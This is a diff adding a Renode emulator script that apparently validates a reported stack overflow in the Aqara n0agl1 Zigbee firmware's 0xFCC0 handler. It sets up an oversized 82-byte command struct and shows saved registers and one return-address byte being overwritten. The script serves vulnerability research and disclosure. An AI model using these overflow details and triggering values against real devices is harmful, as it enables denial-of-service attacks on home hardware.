@@ -1,0 +1,91 @@
+:name: ZB-04 Aqara n0agl1 sub_5014 0xFCC0 constrained overflow — validation (Series 1 / MG13)
+:description: Drives the 0xFCC0 Aqara mfg-specific handler sub_5014 of the real Aqara n0agl1 firmware on an emulated EFR32MG13 (Cortex-M4, Series 1) and demonstrates the constrained stack overflow: an unbounded memmove of (bufLen-5) bytes into a 64-byte buffer fully overwrites saved R4/R5/R6 and corrupts one byte of the saved return address. Bounded by the 82-byte reception cap = constrained CFH/DoS (not full PC control), exactly as the report claims.
+#
+# RESULT (read at PC=0x5042, after memmove, before epilogue):
+#   0x2000EFB0 (buffer)   = 0xAAAAAAAA   payload written
+#   0x2000EFF0 (saved R4) = 0xAAAAAAAA   fully overwritten
+#   0x2000EFF4 (saved R5) = 0xAAAAAAAA   fully overwritten
+#   0x2000EFF8 (saved R6) = 0xAAAAAAAA   fully overwritten
+#   0x2000EFFC (saved LR) = 0xDEADBEAA   low byte 0xEF->0xAA (constrained)
+#
+# Bug (sub_5014 @0x5014): memmove is the FIRST op. count=(uint16)(bufLen-5),
+# dest=SP+0x10 (64B buffer), src=struct[0x8]+5. No clamp (BL sub_C5F0 @0x502a).
+# Prologue push{r4,r5,r6,lr}+sub sp,#0x50: saved R4/R5/R6 at buf[64/68/72],
+# saved LR at buf[76]. bufLen cap 82 -> count 77 -> writes buf[0..76], reaching
+# the saved-LR low byte only. Epilogue 0x5066 `pop {r4,r5,r6,pc}`.
+#
+# NOTE: MG13 MappedMemory writes bypass Renode watchpoint hooks, so we OBSERVE by
+# reading memory at PC=0x5042 (step 300 lands there: after the memmove returns,
+# before the epilogue reuses the frame).
+
+using sysbus
+emulation SetGlobalSerialExecution true
+mach create "zb04"
+machine LoadPlatformDescription @platforms/boards/silabs/brd4162a.repl
+macro reset
+"""
+    sysbus LoadELF @scripts/silabs-vuln/zb04_aqara.elf
+    cpu VectorTableOffset 0x4000
+"""
+runMacro $reset
+logLevel 3
+
+emulation RunFor "0.3"
+pause
+
+# --- Crafted EmberAfClusterCommand-like struct @0x2000A000 ---
+#   [0x08]=source base ptr (0x2000B000)  [0x0C]=bufLen 0x0052 (82)  [0x14]=payloadStartIndex 5
+sysbus WriteDoubleWord 0x2000A000 0x2000B000
+sysbus WriteDoubleWord 0x2000A008 0x2000B000
+sysbus WriteDoubleWord 0x2000A00C 0x00000052
+sysbus WriteByte 0x2000A014 0x05
+
+# --- Source buffer: memmove reads 77 bytes from 0x2000B005. Fill 0xAA sentinel.
+sysbus WriteDoubleWord 0x2000B000 0xAAAAAAAA
+sysbus WriteDoubleWord 0x2000B004 0xAAAAAAAA
+sysbus WriteDoubleWord 0x2000B008 0xAAAAAAAA
+sysbus WriteDoubleWord 0x2000B00C 0xAAAAAAAA
+sysbus WriteDoubleWord 0x2000B010 0xAAAAAAAA
+sysbus WriteDoubleWord 0x2000B014 0xAAAAAAAA
+sysbus WriteDoubleWord 0x2000B018 0xAAAAAAAA
+sysbus WriteDoubleWord 0x2000B01C 0xAAAAAAAA
+sysbus WriteDoubleWord 0x2000B020 0xAAAAAAAA
+sysbus WriteDoubleWord 0x2000B024 0xAAAAAAAA
+sysbus WriteDoubleWord 0x2000B028 0xAAAAAAAA
+sysbus WriteDoubleWord 0x2000B02C 0xAAAAAAAA
+sysbus WriteDoubleWord 0x2000B030 0xAAAAAAAA
+sysbus WriteDoubleWord 0x2000B034 0xAAAAAAAA
+sysbus WriteDoubleWord 0x2000B038 0xAAAAAAAA
+sysbus WriteDoubleWord 0x2000B03C 0xAAAAAAAA
+sysbus WriteDoubleWord 0x2000B040 0xAAAAAAAA
+sysbus WriteDoubleWord 0x2000B044 0xAAAAAAAA
+sysbus WriteDoubleWord 0x2000B048 0xAAAAAAAA
+sysbus WriteDoubleWord 0x2000B04C 0xAAAAAAAA
+sysbus WriteDoubleWord 0x2000B050 0xAAAAAAAA
+sysbus WriteDoubleWord 0x2000B054 0xAAAAAAAA
+
+# --- Call frame: SP0=0x2000F000, r0=struct, LR=0xDEADBEEF sentinel, PC=sub_5014 ---
+sysbus.cpu SetRegister 13 0x2000F000
+sysbus.cpu SetRegister 14 0xDEADBEEF
+sysbus.cpu SetRegister 0  0x2000A000
+sysbus.cpu PC 0x5014
+
+echo ">>> BEFORE: saved R4/R5/R6/LR slots (0x2000EFF0/F4/F8/FC) ="
+sysbus ReadDoubleWord 0x2000EFF0
+sysbus ReadDoubleWord 0x2000EFF4
+sysbus ReadDoubleWord 0x2000EFF8
+sysbus ReadDoubleWord 0x2000EFFC
+
+# Step to PC=0x5042 (just after the memmove returns, before the epilogue).
+sysbus.cpu Step 300
+
+echo ">>> AFTER: buffer start @0x2000EFB0 (expect 0xAAAAAAAA) ="
+sysbus ReadDoubleWord 0x2000EFB0
+echo ">>> saved R4 @0x2000EFF0 (expect 0xAAAAAAAA) ="
+sysbus ReadDoubleWord 0x2000EFF0
+echo ">>> saved R5 @0x2000EFF4 (expect 0xAAAAAAAA) ="
+sysbus ReadDoubleWord 0x2000EFF4
+echo ">>> saved R6 @0x2000EFF8 (expect 0xAAAAAAAA) ="
+sysbus ReadDoubleWord 0x2000EFF8
+echo ">>> saved LR @0x2000EFFC (expect 0xDEADBEAA - one byte corrupted) ="
+sysbus ReadDoubleWord 0x2000EFFC
